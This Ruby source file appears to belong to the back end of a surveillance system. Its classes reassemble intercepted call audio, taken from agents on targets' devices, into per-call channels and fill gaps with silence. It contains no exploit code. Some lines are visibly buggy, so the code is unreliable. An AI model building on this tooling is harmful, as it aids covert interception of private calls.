module RCS
module Worker

require 'ffi'
require 'rcs-common/trace'
require_relative 'speex'
require_relative 'wave'
require_relative 'src'

require 'digest/md5'

class AudioProcessingError < StandardError
  attr_reader :msg
  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

class Channel
  include Tracer
  attr_reader :sample_rate, :start_time, :last_stop_time, :wav_data, :status
  
  def initialize(evidence)
    @name = evidence[:data][:channel].to_s
    @sample_rate = evidence[:data][:sample_rate]
    @start_time = evidence[:data][:start_time]
    @last_stop_time = @start_time
    @wav_data = StringIO.new
    @status = :open
    trace :debug, "created new channel #{self.id}."
  end
  
  def id
    "#{@name}:#{@sample_rate}:#{@start_time.to_f}:#{@last_stop_time.to_f}:#{@status.to_s}"
  end
  
  def self.other_than channel
    channel == :incoming ? :outgoing : :incoming
  end
  
  def close!
    @status = :closed
    trace :debug, "Closing channel #{self.id}"
  end
  
  def closed?
    @status == :closed
  end
  
  def fill(gap)
    samples_to_fill = @sample_rate * gap
    trace :debug, "[#{@name}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
    @wav_data.write([0].pack("S") * samples_to_fill.ceil)
  end
  
  def time_gap(evidence)
    gap = evidence[:data][:start_time].to_f - @last_stop_time.to_f
    trace :debug, "#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
    gap
  end
  
  def accept?(evidence)
    return false if closed?
    return false if time_gap(evidence) >= 5.0
    return true
  end

  def end_call?(evidence)
    return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
  end

  def feed(evidence)
    trace :debug, "Evidence channel #{evidence[:data][:channel]} peer #{evidence[:data][:peer]} with #{evidence[:wav].bytesize} bytes of data."
    
    if end_call? evidence
      self.close!
      return
    end

    gap = time_gap(evidence)
    fill gap unless gap == 0

    @last_stop_time = evidence[:data][:stop_time]
    @wav_data.write evidence.wav
  end

  def size
    @wav_data.size
  end
  
  def num_samples
    bytes.to_f / 16
  end
  
  def seconds
    num_samples.to_f / @sample_rate
  end
  
  def to_s
    self.id
  end
  
  def to_float_samples
    @wav_data.unpack('F*').spack('S*')
  end
end

class Call
  include Tracer
  attr_writer :start_time
  
  # status of call can be:
  #   - :queueing only first channel is present, queue data, maintain speex
  #   - :fillin   second channel arrived, fill in later channel with silence
  #   - :resampling second channel arrived, filled in, resample data as they arrive
  
  def initialize(peer, start_time)
    @peer = peer
    @start_time = start_time
    @status = :queueing
    @channels = {}
    @resampled = :not_yet
    trace :info, "created new call for #{@peer}, starting at #{@start_time}"
  end
  
  def id
    "#{@peer}:#{@start_time.to_f}"
  end
  
  def queueing?
    @channels.size < 2
  end
  
  def fillin?
    @status == :fillin
  end
  
  def accept?(evidence)
    # we accept evidence only if relative channel accept it
    channel = get_channel evidence
    return channel.accept? evidence unless channel.nil?
    trace :debug, "evidence is not being accepted by call #{id}"
    return false
  end
  
  def get_channel(evidence)
    channel = @channels[evidence[:data][:channel]] || create_channel(evidence)
    return channel if channel.accept? evidence
    return nil
  end
  
  def create_channel(evidence)
    channel = Channel.new evidence
    @channels[evidence[:data][:channel]] = channel
    
    # fix start time
    @start_time = get_start_time
    
    return channel
  end
  
  def closed?
    closed_channels = @channels.select {|k,v| v.closed? unless v.nil? }
    return closed_channels.size == @channels.size
  end
  
  def feed(evidence)
    # if evidence is empty or call is closed, refuse feeding
    return false if evidence[:wav].bytesize == 0
    return false if closed?
    
    # get the correct channel for the evidence
    channel = get_channel(evidence)
    return false if channel.nil?
    
    trace :debug, "feeding #{evidence[:wav].bytesize} bytes at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
    channel.feed evidence
    
    # update status
    update_status
    
    return true
  end
  
  def sample_rates
    @channels.values.collect {|c| c.sample_rate}
  end
  
  def min_sample_rate
    sample_rates.sort.first
  end
  
  def update_status
    if @channels.size < 2
      @status == :queueing
      return
    else # we have (at least) two channels
      @status == :fillin
      trace :debug, "Lesser sample rate: #{min_sample_rate}, will be used for resampling."
    end
  end
  
  def to_s
    string = "---\nCALL #{self.id}\n"
    @channels.each {|k, c| string += "\t- #{k} #{c.seconds} #{c.num_samples}\n" }
    string += "---\n"
    return string
  end
   
  def get_start_time
    times = @channels.values.collect {|c| c.start_time.to_f }
    times.min
  end
end

class CallProcessor
  include Tracer
  require 'pp'
  
  def initialize(agent, target)
    @agent = agent
    @target = target
    @calls = []
  end
  
  def get_call(evidence)
    # if peer is unknown or evidence is empty, evidence is invalid, ignore it
    return nil if evidence[:data][:peer].empty? or evidence[:wav].empty?
    
    open_calls = @calls.select {|c| c.accept? evidence and not c.closed? }
    return open_calls.first unless open_calls.empty?

    # no valid call was found, we need to create a new one
    call = create_call evidence
    return call
  end
  
  def create_call(evidence)
    call = Call.new(evidence[:data][:peer], evidence[:data][:start_time])
    @calls << call
    call
  end
  
  def feed(evidence)
    call = get_call evidence
    call.feed evidence unless call.nil?
  end
  
  def store
    # duration
    # status ["recording"]
  end
  
  def to_s
    string = ''
    @calls.each do |c|
      string += "#{c}\n"
    end
    return string
  end
end

end # Audio::
end # RCS::
